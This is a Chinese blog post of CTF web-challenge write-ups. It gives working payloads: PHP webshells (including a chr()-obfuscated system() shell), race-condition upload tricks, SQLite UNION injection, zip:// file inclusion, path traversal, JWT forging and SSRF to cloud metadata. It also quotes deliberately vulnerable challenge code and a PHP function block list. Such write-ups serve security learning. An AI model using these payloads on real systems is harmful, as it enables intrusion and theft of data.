---
title: PolarCTF2026春季赛
date: 2026-03-20 21:15:49
tags:
---

平台和💩一样

## 新年贺卡

当action=admin的时候可以添加模版，并且保存的格式是php

所以我们上传一个shell.php，内容是一句话木马

猜测TEMPLATE_DIR 是templates，访问http://xxx/templates/shell.php

预期解应该是传一个php

```
echo `cat /f*`
```

然后生成并下载贺卡，在生成的时候就会加载模版文件

## 并发上传

题目名说明服务器端很可能存在一个**先保存、后校验/删除**的逻辑漏洞

我们上传shell.php

```php
<?php
file_put_contents('shell2.php', '<?php @eval($_POST["pass"]); ?>');
```

我们用bp同时开启两个instruder任务，一个不断上传shell.php,一个不断访问http://xxx/upload/shell.php

一旦shell.php上传成功且未被删除的瞬间，成功访问它，从而触发 `file_put_contents` 生成 `shell2.php`

## sql_search

查询polar能出来含有polar的结果，测试发现注入点应该在like语句后面

```
polar%' and 1=1 --+
```

成功查询，并且#注释不好用，用order by确定是3列

```
polar%' union select 1,2,sqlite_version() --+
```

这里确定是sqlite数据库，上网找了一篇文章

[sql注入笔记-sqlite - ~kagi~ - 博客园](https://www.cnblogs.com/kagari/p/11631085.html)

```
polar%' union select 1,2,group_concat(name) FROM sqlite_master WHERE type='table' --+查表名
polar%' union select 1,2,group_concat(name) FROM sqlite_master WHERE type='table' and name='flaaaaaaaag' --+查字段名
polar%' union select 1,2,flag FROM flaaaaaaaag --+查flag
```

## The_Gift

```php
<?php
include 'config.php';

highlight_file(__FILE__);
error_reporting(0);

class ConfigModel {
    public $apiKey = '';
    public $isAdmin = false; 
    public $requestTime = 0;

    public function __construct() {
        $this->requestTime = time();
        $this->apiKey = md5($_SERVER['REMOTE_ADDR'] . rand(1, 99999) . "S4ltY_String");
    }

    public function validateApiKey($inputKey) {
        if ($inputKey === $this->apiKey) {
            $this->isAdmin = true;
            return true;
        }
        return false;
    }
}

$config = new ConfigModel();

$requestData = array_merge($_GET, $_POST);
foreach ($requestData as $key => $value) {
    $$key = $value;
}

if (isset($user_api_key)) {
    $config->validateApiKey($user_api_key);
}

if (is_array($config) && isset($config['isAdmin']) && $config['isAdmin'] === 'true') {
    die("Success" . $FLAG);
} else {
    echo "<br>Access Denied.";
}
```

ai一把锁

```
http://xxx/?config[isAdmin]=true
```

## Signed_Too_Weak

![image-20260322115524618](https://gitee.com/bobrocket/img/raw/master/image-20260322115524618.png)

首先发现一个key，猜测是jwt，爆破出密钥是polar，直接伪造admin

![image-20260322115742835](https://gitee.com/bobrocket/img/raw/master/image-20260322115742835.png)

![image-20260322115731207](https://gitee.com/bobrocket/img/raw/master/image-20260322115731207.png)





## Pandora Box

只允许上传jpg和php，并且后端会进行检查，发现了一个文件读取漏洞，我们读一下index.php

```php
 if (isset($_GET['file'])) {
            $file = $_GET['file'];
            echo "<div class='log-box'><strong>[System Error Log]:</strong><br>";
            
            // === 绝杀点 ===
            // 强制拼接 .php，导致普通图片马失效
            // 选手必须看到报错 'include(xxx.jpg.php)' 才能反应过来
            include($file . '.php');
            
            echo "</div>";
        }
```

这里有一个文件包含漏洞，但是强制拼接了php后缀，刚开始打算打pearcmd.php，但是貌似不行

我们把一句话木马打包成zip，并更改后缀名为jpg上传

![image-20260322123231404](https://gitee.com/bobrocket/img/raw/master/image-20260322123231404.png)

我们得到了文件的路径，下面我们使用zip伪协议

```
?file=zip://upload/f344391640e99035dcf6b49b74f3c7da.jpg%23ma
```

![image-20260322123416142](https://gitee.com/bobrocket/img/raw/master/image-20260322123416142.png)

# 补档

## 杰尼龟系统

好多假的flag，气死了，当时怎么没想到，光盯着根目录的flag.txt了

![image-20260322115219907](https://gitee.com/bobrocket/img/raw/master/image-20260322115219907.png)

![image-20260322115258396](https://gitee.com/bobrocket/img/raw/master/image-20260322115258396.png)

## coke粉丝团

感觉逻辑有点难想，能猜到是jwt，但是只有在最后一步读flag时jwt才会被解析

 随便购买一个东西然后抓包把价格改成负数可以获得无线钻石或者把id改成520等级改成10都可以达到10级

```
card_id=520&level=10&price=80
```

点击获取flag提示必须是admin，这里爆破出jwt的密钥是coke，直接伪造一个

![image-20260322122137130](https://gitee.com/bobrocket/img/raw/master/image-20260322122137130.png)

## static

这个应该能做出来的，奈何靶机不给力

```php
<?php
    highlight_file(__FILE__);
    error_reporting(E_ALL);
    
    function hard_filter(&$file) {
        $ban_extend = array("php://", "zip://", "data://", "%2f", "%00", "\\");
        foreach ($ban_extend as $ban) {
            if (stristr($file, $ban)) {
                return false;
            }
        }

        $ban_keywords = array("eval", "system", "exec", "passthru", "shell_exec", "assert", "../");
        foreach ($ban_keywords as $keyword) {
            if (stristr($file, $keyword)) {
                $count = 0;
                $file = str_replace($keyword, "", $file, $count); 
                break;
            }
        }
        
        $file = rtrim($file, '/');
        if (strpos($file, "static/") !== 0) {
            return false;
        }
        
        return true;
    }

    $file = $_GET['file'] ?? '';
    if (!hard_filter($file)) {
        die("Illegal request!");
    }
    
    $real_file = $file . ".php";
    $real_path = realpath($real_file) ?: $real_file;
    
    echo "<br>=== 调试信息 ===<br>";
    echo "1. 原始输入: " . htmlspecialchars($_GET['file'] ?? '') . "<br>";
    echo "2. 过滤后file: " . htmlspecialchars($file) . "<br>";
    echo "3. 拼接后的路径: " . htmlspecialchars($real_file) . "<br>";
    echo "4. 真实解析路径: " . htmlspecialchars($real_path) . "<br>";
    echo "5. 文件是否存在: " . (file_exists($real_path) ? "是" : "否") . "<br>";
    
    if (file_exists($real_path)) {
        echo "6. 正在包含文件...<br>";
        ob_start();
        include($real_path);
        $content = ob_get_clean();
        echo "7. 文件内容: " . htmlspecialchars($content) . "<br>";
    } else {
        echo "6. 错误：文件不存在！<br>";
    }
```

简单的路径穿越

```
/?file=static/....//flag
```

## 云中来信

能想到是SSRF，但没想到是云元数据泄露，出题人表示在名字上进行了提示:(

[OWASP安全问题：“云元数据(Cloud Metadata)可能已暴露”问题解决 - 知乎](https://zhuanlan.zhihu.com/p/677029525)

访问/latest/meta-data,给了一个目录让去获取token

![image-20260322162646968](https://gitee.com/bobrocket/img/raw/master/image-20260322162646968.png)

访问/latest/api/token

![image-20260322162715257](https://gitee.com/bobrocket/img/raw/master/image-20260322162715257.png)

请求的时候带上

![image-20260322162746023](https://gitee.com/bobrocket/img/raw/master/image-20260322162746023.png)

再去访问这个目录就可

![image-20260322162802469](https://gitee.com/bobrocket/img/raw/master/image-20260322162802469.png)

## GET

首先有一个robot.txt,提示If it won't open, maybe try including each other and see.

主页面是文件上传，禁止了危险文件的后缀，这里可以用双写文件后缀名绕过，上传php

但是它对文件内容也做了检查，基础🐎死了，这里写一个ascii🐎

```php
<?php
$func=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$cmd='';
$cmd_chars=[99, 97, 116, 32, 46, 46, 47, 54, 42];
foreach($cmd_chars as $ascii){
    $cmd.=chr($ascii);
}
@$func($cmd);
```

这里发现/var/www/html目录下有两个可疑的php文件，一个访问的时候没有权限，一个空白

这是想起一开始的提示，我们看一下打开空白的php文件的内容

```php
<?php
// 最简单的文件包含漏洞演示
// 接收用户传入的文件名参数
$file = $_GET['file'];

// 直接包含用户指定的文件（无任何过滤，存在严重漏洞）
include $file;
```

我们用这个php文件包含另一个就出来了
